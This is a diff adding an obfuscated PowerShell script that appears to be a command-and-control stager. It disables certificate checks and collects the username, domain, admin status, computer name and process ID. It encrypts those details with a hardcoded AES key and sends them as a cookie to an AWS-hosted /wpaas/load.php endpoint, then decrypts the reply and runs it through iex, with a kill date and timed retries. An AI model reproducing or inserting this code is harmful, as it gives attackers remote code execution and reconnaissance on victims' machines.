@@ -1,0 +1,94 @@
+${u`6O}  =  [Type]("{5}{2}{0}{4}{3}{1}" -f 'ER','r','Em.nET.S','AnAGe','VICePoIntM','sYSt'  )   ;    ${59f`W`Rn}  =  [TyPe]("{3}{6}{7}{2}{10}{1}{9}{0}{4}{8}{5}" -F 'y','PTOGraP','iTY','SyST','.','Mode','Em.se','cuR','cIpHer','H','.crY')    ;  sET-itEm  (  "VariA"  +"bL" +"E"+ ":5X1S9") ( [tYpe]("{4}{5}{10}{7}{8}{2}{6}{0}{9}{3}{1}" -F 'phy.P','ODe','cRY','Ngm','S','YsTeM','ptOgRA','IT','y.','AdDI','.sECuR' )  )   ;     ${A`7fjh}  =  [TYpE]( "{4}{0}{1}{2}{3}" -F'Y','stEm','.convER','t','s' )   ;   ${x`sa} =    [TYPe](  "{3}{6}{2}{1}{4}{5}{0}" -f'G','EM','st','S','.tE','XT.ENCodIn','Y'  )  ; sEt-iTEM  ( 'V'+  'a'+  'rI' +'AbLe:7r'  +'pI' ) (   [tYpe]("{0}{2}{1}" -F'dATe','ImE','T' )  )  ; SET-ITeM  (  "v" +"ARiabLe:"+ "v"  +  "8dfKx"  )  (  [type]("{1}{5}{0}{7}{2}{6}{3}{4}"-f'EM.','SY','TT','qu','esThEadER','ST','pre','neT.H')    )  ; sET (  'Xa3'+'0nS' ) ([tYPE](  "{2}{8}{5}{3}{4}{7}{6}{1}{9}{0}"-f 'Y','w','S','CuriTy.p','rinCIP','e','DO','al.Win','ystEM.S','SIDentIt')   )  ; ${b`Wf8E} =[type](  "{1}{4}{0}{2}{10}{8}{7}{3}{5}{6}{9}"-F'EM.s','s','E','CiPAl.WiNdOw','ySt','sbU','ilTInroL','iN','R','E','cURIty.p' ); sv  ( "{1}{0}"-f 't','YOj' )  (   [TYpE]("{1}{0}" -f 'Ray','Ar' )   )  ;    ${u`6o}::"seRVe`R`cer`TIfIc`A`TEVA`lI`d`A`TioNcALLb`ACk"  =   {${T`RuE}}
+${df}=@("")
+${H} = ""
+${S`C} =  ""
+${Ur`LS}= @(( "{4}{9}{12}{10}{1}{11}{2}{6}{7}{8}{0}{5}{13}{3}" -f'.com','1','.','amazonaws.com','https','put','eu-cent','ral','-1','://','c2-','8-156-194-116','e','e.'  )  )
+${Cu`RL}= ( "{3}{1}{2}{0}" -f 'hp/','/l','oad.p','/wpaas' )
+${s}= ${u`Rls}[0]
+function C`Am (${K`Ey},${I`V} ){
+try {${A}  =   & ("{2}{1}{0}" -f 'ct','e','New-Obj'  ) ("{4}{5}{7}{1}{6}{9}{3}{10}{0}{2}{8}" -f'l','.Cr','M','Rijnd','Sys','tem.Securit','yptograph','y','anaged','y.','ae'  )
+} catch {${A}  =   &  ( "{0}{2}{1}" -f 'New-O','ct','bje'  ) (  "{8}{9}{5}{1}{6}{11}{0}{2}{10}{12}{4}{7}{3}"-f 'graphy.A','ty','esC','vider','ervicePr','ecuri','.','o','Syst','em.S','rypt','Crypto','oS'  )}
+${a}."m`oDE"  =     (  gET-vARiabLe  ('59' +  'fWR'  +'n'  )  -VaLUE    )::"c`Bc"
+${A}."p`A`ddiNG" =     (  vARiAblE (  '5' +  'x1S9' ) -VALue   )::"zer`OS"
+${a}."bLo`cK`Size"   =   128
+${A}."K`ey`SIze"   =  256
+if ( ${I`V} )
+{
+if (${IV}.("{1}{0}"-f'pe','getTy' ).Invoke(  )."nA`ME" -eq ( "{1}{0}" -f'ring','St') )
+{${A}."iV"  =     ( vaRiABLe ('a7F' + 'jH' ) ).vALUE::(  "{4}{3}{2}{0}{1}" -f 't','ring','e64S','Bas','From').Invoke( ${iV}  )}
+else
+{${a}."IV"  =  ${Iv}}
+}
+if (${k`eY} )
+{
+if (  ${k`Ey}.(  "{1}{0}" -f 'Type','get' ).Invoke(  )."Na`me" -eq ( "{1}{0}" -f'g','Strin'  ))
+{${A}."k`eY"  =    (   VaRiabLe ("{0}{1}" -f'a','7Fjh')   ).vALUe::( "{3}{2}{0}{1}{4}"-f 'se','64St','omBa','Fr','ring'  ).Invoke(  ${K`EY}  )}
+else
+{${a}."k`Ey"   =   ${k`ey}}
+}
+${A}}
+function E`Nc (${K`EY},${U`N}){
+${B}   =    (    GET-vArIable  (  'x'  +'sa'  )  -vaLuEo   )::"U`Tf8".("{1}{2}{0}"-f 's','G','etByte'  ).Invoke(${U`N}  )
+${A}  =     & ("{0}{1}" -f 'CA','M' ) ${k`eY}
+${E}  =   ${a}.("{0}{1}{2}{3}"-f 'CreateE','n','crypto','r' ).Invoke(  )
+${F} = ${e}.( "{3}{1}{2}{0}"-f'lock','fo','rmFinalB','Trans').Invoke( ${B}, 0, ${b}."LeN`Gth"  )
+[byte[]] ${P}  =  ${a}."iv"  +   ${F}
+ (    gEt-VaRIABLe ( "a7" +  "fjh")   ).VALue::"TO`B`ASe64St`RinG"( ${P} )
+}
+function d`Ec ( ${k`EY},${E`NC} ){
+${b}   =     ${A`7`FJH}::("{4}{3}{0}{2}{1}" -f 'Base','ring','64St','m','Fro' ).Invoke(${E`NC})
+${i`V}  = ${b}[0..15]
+${A} =  .  (  "{0}{1}"-f 'C','AM') ${k`ey} ${I`V}
+${D}   = ${a}.( "{2}{1}{3}{0}"-f'ryptor','eate','Cr','Dec'  ).Invoke(  )
+${u}   =  ${d}.("{0}{5}{1}{2}{3}{4}" -f'Tra','Fina','lB','l','ock','nsform'  ).Invoke(  ${b}, 16, ${b}."L`enGTH" - 16  )
+  (    GcI (  "va"  + "r" + "IaBLe"  +":xSa" )).vaLue::"U`TF8"."GETST`R`ING"(   (  GEt-VaRIaBLe ( "{1}{0}" -f'fjh','A7' )  -ValUe    )::"fRoMBA`Se`64stR`I`NG"(  (  vArIaBle ("{0}{1}" -f'x','SA'  )  -vA )::"U`Tf8"."ge`Ts`TRINg"(  ${u})."Tr`iM"(  [char]0 )) )}
+function GE`T`-WEB`CLIent ( ${C`Oo`kIE} ) {
+${d} =   (    & ( "{2}{1}{0}" -f 'ate','t-D','Ge'  ) -Format ("{2}{0}{1}"-f '-M','M-dd','yyyy' ) ) ; 
+${D}   =   ${7r`pI}::(  "{0}{1}{2}{3}"-f'Par','seE','xac','t').Invoke( ${D},( "{2}{1}{0}"-f'yy-MM-dd','y','y'),${nu`LL} );
+${K}   =   (vARIaBle  ( "7r"+"pi" ) -vaLueO)::("{0}{2}{1}" -f'ParseEx','ct','a').Invoke(  ( "{2}{1}{0}"-f '1','-10-0','2021' ),( "{3}{1}{2}{0}"-f '-dd','y','y-MM','yy'),${N`Ull}  )  ; 
+if ( ${k} -lt ${d}) {exit}
+${U`sErnaME}  = ""
+${p`AssWo`Rd}   =  ""
+${p`RoxYu`Rl}  =   ""
+${Wc} =  &  ( "{0}{2}{1}" -f 'New','Object','-') ( "{0}{1}{2}{3}{4}" -f'Syst','em','.N','e','t.WebClient');
+
+if (${h} -and (  ( ${pSVErs`I`on`T`ABlE}."CLR`V`ER`siOn"."ma`JOR" -gt 2) ) ) {${Wc}."HEA`dE`RS".( "{1}{0}"-f 'd','Ad').Invoke(  ("{0}{1}" -f'H','ost'  ),${h})}
+elseif(  ${H}){${s`cRIpt:S}=  "https://$($h)/wpaas/load.php/" ;${sc`R`I`pt:Sc}=  "https://$($h)"}
+${W`c}."HEadE`RS".(  "{0}{1}" -f 'Ad','d'  ).Invoke(("{3}{1}{0}{2}" -f 'g','-A','ent','User'),(  "{6}{3}{12}{18}{7}{14}{15}{16}{0}{13}{9}{10}{11}{17}{5}{8}{2}{4}{1}"-f '.3','36','/537','/5.0 (','.',' S','Mozilla','d','afari','(KHTML, like Gecko) Chrome/','8','0.0.39','Wi','6 ','ows NT 10.','0; Win64; x64) Apple','WebKit/537','87.122','n'  ))
+${W`c}."h`eadErs".("{0}{1}" -f'A','dd'  ).Invoke((  "{1}{0}{2}"-f 'efer','R','er'  ),"")
+if ( ${ProX`yU`RL}) {
+${w`p}  =    & ( "{2}{1}{0}" -f'w-Object','e','N') (  "{2}{1}{0}{3}{4}" -f '.','ystem','S','Net.','WebProxy' )(${p`ROXYU`Rl},${TR`Ue} );
+if ( ${UsE`RNaMe} -and ${p`A`SswO`Rd}  ) {
+${p`ss}  =   & ( "{3}{1}{4}{0}{2}"-f 'n','SecureStr','g','ConvertTo-','i') ${pA`SSw`o`RD} -AsPlainText -Force;
+${gET`C`REds}  =  &("{1}{2}{0}"-f 'ect','new-','obj') (  "{5}{3}{4}{7}{0}{1}{2}{6}"-f 'auto','mat','ion.PSCre','m','an','system.','dential','agement.' ) ${uSerNA`me},${p`sS};
+${Wp}."CreDenti`A`LS"  = ${g`EtCrE`dS}; 
+} else { ${wc}."useDef`Aul`T`C`REDe`NTials"  = ${T`RuE} ;   }
+${w`c}."P`RoXY" =   ${w`p} ;  } else {
+${W`C}."usEDeFAuLtc`R`e`deNTi`A`LS"  =   ${t`RuE};
+${W`c}."P`RoXY"."cREDE`N`TIalS"  =   ${w`c}."c`RedE`N`TiALs"  ;  
+} if (  ${C`OO`KiE} ) { ${wC}."Hea`D`eRs"."A`Dd"(  ${V8`DF`KX}::"C`ookie", "SessionID=$Cookie" ) }
+${W`C}}
+function PRi`MerN(${U`Rl},${u`RI},${d`F} ) {
+${ScRIp`T:s}= ${u`Rl}+${U`RI}
+${S`Cr`Ipt`:sc}=  ${U`RL}
+${sC`R`Ipt:h}=${dF}
+${C`U}  =     ( get-varIaBlE ('Xa3'+'0ns'  )    ).VaLuE::(  "{1}{2}{0}" -f'rrent','Ge','tCu').Invoke()
+${Wp} =   &(  "{2}{1}{0}"-f'ct','-Obje','New'  ) ( "{2}{1}{11}{8}{0}{9}{7}{6}{5}{4}{10}{3}"-f'y','em','Syst','owsPrincipal','i','al.W','p','Princi','it','.','nd','.Secur')(  ${c`U} )
+${aG}   =  (   GCi  ( "varIabl"+"E:"+  "B"  +  "wf8E"  ) ).vAlue::"aD`M`iNisTra`TOR"
+if ( ${w`P}.("{0}{2}{1}" -f 'Is','nRole','I').Invoke(  ${AG} ) ){${E`l}=  "*"}else{${E`L}= ""}
+try{${U} = (  ${Cu})."Na`me"+  ${E`L}} catch{if (  ${enV`:us`e`RNaMe} -eq "$($env:computername)$" ){}else{${U}  =${en`V:USe`R`NAme}}}
+${O}=  "$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;1"
+try {${pp}  =   & (  "{0}{1}" -f'en','c') -key ( "{2}{7}{5}{1}{3}{4}{6}{0}"-f 'oBU=','sipmFWUf+p09UWTu49FVwE','78Ef','tt','P07','H','gklQT','dO/' ) -un ${o}} catch {${P`P} =("{0}{1}"-f'ERRO','R'  )}
+${PRiME`Rn} =  (   &("{1}{2}{0}{3}" -f'c','Get-W','eb','lient' ) -Cookie ${P`P} ).(  "{3}{1}{0}{2}" -f 'r','oadst','ing','downl'  ).Invoke(${S`Cr`IPT:S}  )
+${P} =  . ("{1}{0}"-f 'c','de' ) -key ("{4}{2}{10}{5}{0}{7}{3}{9}{8}{1}{6}"-f'pmFW','oBU','E','f+p09UWT','78','dO/Hsi','=','U','P07gklQT','u49FVwEtt','f' ) -enc ${pr`I`MeRn}
+if (  ${P} -like (  "{0}{1}" -f'*k','ey*' )) {${p}  |   &  ("{0}{1}" -f 'i','ex' )}
+}
+function PriM`ers {
+foreach(  ${U`RL} in ${U`Rls} ){
+${I`NDex}  =    ( gCi  ( "{3}{0}{2}{4}{1}"-f 'le','OJT',':','VaRIAb','Y'  )  ).ValuE::(  "{1}{2}{0}" -f'f','I','ndexO'  ).Invoke(  ${UR`lS}, ${U`RL}  )
+try {.( "{0}{1}"-f 'prim','ern') ${U`RL} ${Cu`RL} ${Df}[${I`Nd`eX}]} catch {.(  "{0}{3}{1}{2}" -f 'w','-outp','ut','rite' ) ${err`or}[0]}}}
+.(  "{1}{0}"-f 'rimers','p'  )
+.("{0}{3}{2}{1}"-f 'St','p','Slee','art-' ) 300
+ &  (  "{2}{1}{0}" -f'rs','e','prim')
+&  ( "{3}{1}{0}{2}" -f'-Sl','t','eep','Star'  ) 600
+  &("{1}{0}" -f 'ers','prim')
